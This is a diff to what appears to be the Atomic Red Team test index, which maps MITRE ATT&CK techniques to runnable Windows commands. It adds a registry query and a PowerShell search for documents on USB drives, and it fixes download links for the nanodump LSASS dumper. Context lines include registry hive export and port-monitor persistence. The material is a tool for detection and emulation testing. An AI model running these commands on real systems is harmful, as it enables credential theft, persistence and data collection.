@@ -1444,6 +1444,8 @@ check for existence of software of interest to them. Status of SIL can be checke
 [Reference](https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/)
 ",windows,,,"reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
 ",command_prompt,True,,,,,
+T1012,Query Registry,Inspect SystemStartOptions Value in Registry,96257079-cdc1-4aba-8705-3146e94b6dce,"The objective of this test is to query the SystemStartOptions key under HKLM\SYSTEM\CurrentControlSet\Control in the Windows registry. This action could be used to uncover specific details about how the system is configured to start, potentially aiding in understanding boot parameters or identifying security-related settings. key is.",windows,,,"reg.exe query HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions
+",command_prompt,,,,,,
 T1526,Cloud Service Discovery,Azure - Dump Subscription Data with MicroBurst,1e40bb1d-195e-401e-a86b-c192f55e005c,"Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. 
 The resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. 
 See https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1
@@ -8139,6 +8141,12 @@ reg export HKLM\security %temp%\security
 del %temp%\system >nul 2> nul
 del %temp%\security >nul 2> nul
 ",,,
+T1025,Data from Removable Media,Identify Documents on USB and Removable Media via PowerShell,0b29f7e3-a050-44b7-bf05-9fb86af1ec2e,"This test simulates an attack where PowerShell is used to detect connected USB or other removable storage devices and gather a list of specific document files 
+(e.g., .docx, .xls, .txt, .pdf). The command works by first identifying removable drives on the system and then recursively searching through each one for files 
+matching the targeted extensions. If no removable drives are present, the script will return a message stating that no media is detected. This behavior mimics 
+how adversaries might scan for sensitive documents on removable devices for exfiltration or analysis.
+",windows,,,"powershell.exe -c ""Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }""
+",command_prompt,,,,,,
 T1547.010,Boot or Logon Autostart Execution: Port Monitors,Add Port Monitor persistence in Registry,d34ef297-f178-4462-871e-9ce618d44e50,Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.,windows,,,"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f
 ",command_prompt,True,,"reg delete ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /f >nul 2>&1
 ",,,"input_arguments.monitor_dll.description: Addition to port monitor registry key. Normally refers to a DLL name in C:\Windows\System32 but an arbitrary DLL can be specified with the absolute path.
@@ -12741,7 +12749,7 @@ dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayl
 
 dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
-Invoke-WebRequest ""https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"" 
+Invoke-WebRequest ""https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"" 
 
 ",
 T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using Windows Task Manager,dea6c349-f1c6-44f3-87a1-1ed33a59a607,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
@@ -12961,7 +12969,7 @@ dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayl
 
 dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
-Invoke-WebRequest ""https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe""
+Invoke-WebRequest ""https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe""
 
 ","input_arguments.output_folder.description: Folder Path where resulting dump should be placed
 
